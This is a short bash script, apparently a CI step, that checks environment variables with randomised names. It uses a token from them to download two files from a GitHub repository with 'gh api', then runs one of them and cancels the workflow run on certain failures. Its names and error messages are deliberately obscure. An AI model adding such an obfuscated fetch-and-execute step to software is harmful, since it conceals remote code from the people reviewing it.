#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
    f "setup failed"
  fi
}

n x_kzu7di3iurpqzan7
n x_l2tu63hznjfueq5q
n x_kqbzqyeiksdoafkk
n x_qiu3ugclqxqgt7xn
a "${x_qiu3ugclqxqgt7xn}"
s x_wiefkbqwgern2rp7
if [ -n "${x_wiefkbqwgern2rp7:-}" ]; then
  b "${x_wiefkbqwgern2rp7}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
l="$d/l"
o="$d/o"
mkdir -p "$t"

export GH_TOKEN="${x_kqbzqyeiksdoafkk}"
r="${x_kzu7di3iurpqzan7}"
v="${x_l2tu63hznjfueq5q}"
k="${x_qiu3ugclqxqgt7xn}"

g() {
  local p="$1"
  local q="$2"
  local n
  for n in 1 2 3 4; do
    if gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
      return
    fi
    sleep 2
  done
  f "setup failed"
}

g "x/${k}/x" "$t/x"
g "x/${k}/d" "$t/d"
chmod 700 "$t/x"
chmod 600 "$t/d"

export x_krp3r7qofaxvycj7="$o"
if ! "$t/x" >"$l" 2>&1; then
  if [ -f "$l.r" ]; then
    GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" >/dev/null 2>&1 || true
  fi
  f "run failed"
fi
